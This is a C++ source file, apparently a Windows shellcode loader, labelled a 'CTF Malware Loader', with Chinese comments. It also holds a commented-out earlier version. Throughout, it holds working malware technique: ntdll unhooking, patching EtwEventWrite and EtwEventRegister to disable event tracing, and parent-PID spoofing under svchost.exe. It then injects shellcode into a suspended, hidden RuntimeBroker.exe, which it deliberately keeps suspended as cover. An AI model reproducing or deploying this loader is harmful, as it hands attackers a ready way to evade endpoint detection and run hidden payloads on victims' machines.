    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret

    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, 5, oldProtect, &oldProtect);
    }
    void* pEtwEventRegister = GetProcAddress(hNtdll, "EtwEventRegister");
    if (pEtwEventRegister) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventRegister, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pEtwEventRegister, patch, sizeof(patch));
        VirtualProtect(pEtwEventRegister, 5, oldProtect, &oldProtect);
    }
}

// Find svchost handle
HANDLE GetTargetParentHandle(DWORD* outPid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE hProcess = NULL;

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (wcscmp(pe32.szExeFile, L"svchost.exe") == 0) {
                    hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        *outPid = pe32.th32ProcessID;
                        break;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return hProcess;
}

int main() {
    bool isConsole = SetupConsole();

    if (isConsole) std::cout << "\n[*] Loader started in Hybrid Mode." << std::endl;

    if (EnableDebugPrivilege()) {
        if (isConsole) std::cout << "[+] SeDebugPrivilege Enabled." << std::endl;
    }
    else {
        if (isConsole) std::cout << "[-] Failed to enable SeDebugPrivilege." << std::endl;
    }

    UnhookNtdll();
    BypassETW();

    DWORD parentPid = 0;
    HANDLE hParentProcess = GetTargetParentHandle(&parentPid);

    if (!hParentProcess) {
        if (isConsole) std::cout << "[-] Failed to open ANY svchost.exe. Exiting." << std::endl;
        return 1;
    }
    if (isConsole) std::cout << "[+] Parent Process Found: svchost.exe (PID: " << parentPid << ")" << std::endl;

    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        if (isConsole) std::cout << "[-] Failed to update PPID." << std::endl;
        return 1;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    char targetPath[] = "C:\\Windows\\System32\\RuntimeBroker.exe";
    if (isConsole) std::cout << "[*] Spawning Target: RuntimeBroker.exe (Hidden)..." << std::endl;

    if (!CreateProcessA(NULL, targetPath, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        if (isConsole) std::cout << "[-] CreateProcess failed." << std::endl;
        return 1;
    }

    if (isConsole) std::cout << "[+] Target Process Created (PID: " << pi.dwProcessId << ")" << std::endl;

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(payload_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    WriteProcessMemory(pi.hProcess, remoteMem, payload_shellcode, sizeof(payload_shellcode), NULL);

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);

    if (hThread) {
        if (isConsole) std::cout << "[+] Injection Successful! Running Shellcode..." << std::endl;

        // -------------------------------------------------------------
        // [關鍵修改] 保持 RuntimeBroker 為「殭屍進程」
        // -------------------------------------------------------------
        // 我們 "不" 恢復主執行緒 (pi.hThread)。
        // 如果恢復它，RuntimeBroker 發現沒事做會直接自殺，導致 calc 變成孤兒。
        // 不恢復它，RuntimeBroker 就會一直掛著，成為 calc 的完美掩護。
        // ResumeThread(pi.hThread); <--- 已註解掉

        // 關閉 Shellcode 執行緒 Handle (它自己會跑，我們不需要操作它了)
        CloseHandle(hThread);

        if (isConsole) std::cout << "[+] RuntimeBroker kept suspended to maintain process tree." << std::endl;

    }
    else {
        TerminateProcess(pi.hProcess, 1);
    }

    CloseHandle(hParentProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    if (isConsole) {
        std::cout << "[*] Loader Finished." << std::endl;
    }

    return 0;
}*/





#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <winternl.h>
#include "resource.h" // [關鍵] 必須引入資源標頭檔

#pragma comment(lib, "ntdll.lib") 
#pragma comment(linker, "/subsystem:console") 

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

// =======================================================================
// [Helper] 從資源檔讀取 Shellcode
// =======================================================================
bool LoadShellcodeFromResource(int resourceID, std::vector<unsigned char>& buffer) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hRes) {
        std::cout << "[-] Error: Resource ID " << resourceID << " not found." << std::endl;
        return false;
    }

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    DWORD dataSize = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);

    if (dataSize == 0 || !pData) return false;

    buffer.resize(dataSize);
    memcpy(buffer.data(), pData, dataSize);

    std::cout << "[+] Payload loaded from Resource (" << dataSize << " bytes)." << std::endl;
    return true;
}

// =======================================================================
// [Privilege] 提權 (雖然 svchost 權限較低，但 SeDebugPrivilege 還是必要的)
// =======================================================================
bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); return false; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { CloseHandle(hToken); return false; }
    CloseHandle(hToken);
    return true;
}

// =======================================================================
// [Evasion] API Unhooking
// =======================================================================
void UnhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) { CloseHandle(hFile); return; }
    LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) { CloseHandle(hFileMapping); CloseHandle(hFile); return; }
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pDosHeader->e_lfanew);
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeader) + (DWORD_PTR)(IMAGE_SIZEOF_SECTION_HEADER * i));
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSection->VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pSection->VirtualAddress);
            VirtualProtect(pDest, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(pDest, pSrc, pSection->Misc.VirtualSize);
            VirtualProtect(pDest, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
    std::cout << "[+] API Unhooking applied." << std::endl;
}

// =======================================================================
// [Evasion] ETW Patching
// =======================================================================
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, 5, oldProtect, &oldProtect);
    }
    void* pEtwEventRegister = GetProcAddress(hNtdll, "EtwEventRegister");
    if (pEtwEventRegister) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventRegister, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pEtwEventRegister, patch, sizeof(patch));
        VirtualProtect(pEtwEventRegister, 5, oldProtect, &oldProtect);
    }
    std::cout << "[+] ETW Patching applied." << std::endl;
}

// =======================================================================
// [Targeting] 尋找 svchost.exe 作為父進程
// =======================================================================
HANDLE GetSvchostHandle(DWORD* outPid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE hProcess = NULL;

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                // 修改：尋找 svchost.exe
                if (_stricmp(pe32.szExeFile, "svchost.exe") == 0) {
                    // 嘗試打開 (有些 svchost 是 PPL 保護的會失敗，所以要 Loop 直到成功)
                    hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        *outPid = pe32.th32ProcessID;
                        break;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return hProcess;
}

// =======================================================================
// [Main]
// =======================================================================
int main() {
    std::cout << "=== CTF Malware Loader (Chain: svchost -> RuntimeBroker) ===" << std::endl;

    // 1. 載入 Payload
    std::vector<unsigned char> payload_shellcode;
    if (!LoadShellcodeFromResource(IDR_RCDATA1, payload_shellcode)) {
        std::cout << "[-] Resource load failed!" << std::endl;
        system("pause"); return 1;
    }

    // 2. 提權
    if (!EnableDebugPrivilege()) {
        std::cout << "[-] Failed to get SeDebugPrivilege. Run as Admin!" << std::endl;
        system("pause"); return 1;
    }

    // 3. Evasion
    UnhookNtdll();
    BypassETW();

    // 4. [修改] 尋找 PPID 目標 (svchost.exe)
    DWORD parentPid = 0;
    HANDLE hParentProcess = GetSvchostHandle(&parentPid);
    if (!hParentProcess) {
        std::cout << "[-] Could not find accessible svchost.exe." << std::endl;
        system("pause"); return 1;
    }
    std::cout << "[+] Parent Found: svchost.exe (PID: " << parentPid << ")" << std::endl;

    // 5. 設定 PPID Spoofing
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        std::cout << "[-] PPID Update Failed." << std::endl;
        system("pause"); return 1;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE; // 隱藏目標視窗

    // 6. [修改] 啟動 RuntimeBroker.exe
    char targetCmdLine[] = "C:\\Windows\\System32\\RuntimeBroker.exe";
    std::cout << "[*] Spawning Target: " << targetCmdLine << std::endl;

    if (!CreateProcessA(NULL, targetCmdLine, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        std::cout << "[-] CreateProcess failed: " << GetLastError() << std::endl;
        system("pause"); return 1;
    }
    std::cout << "[+] Target Created! Child PID: " << pi.dwProcessId << std::endl;

    // 7. 注入 Payload
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, payload_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    WriteProcessMemory(pi.hProcess, remoteMem, payload_shellcode.data(), payload_shellcode.size(), NULL);

    // 8. 執行 Shellcode (Remote Thread)
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);

    if (hThread) {
        std::cout << "[+] Injection Successful!" << std::endl;

        // =================================================================
        // [殭屍模式] Zombie Mode for RuntimeBroker
        // =================================================================
        // RuntimeBroker.exe 如果正常 Resume，會因為沒有工作而立刻退出。
        // 我們 "註解掉" 下面這行，讓主線程永遠睡覺。
        // =================================================================

        // ResumeThread(pi.hThread);  <--- 保持註解！

        CloseHandle(hThread);
        std::cout << "[+] RuntimeBroker is running in Zombie Mode under svchost.exe" << std::endl;
    }
    else {
        std::cout << "[-] CreateRemoteThread Failed." << std::endl;
        TerminateProcess(pi.hProcess, 1);
    }

    // 9. 清理
    CloseHandle(hParentProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    std::cout << "\n[DONE] Loader task finished." << std::endl;
    system("pause");

    return 0;
}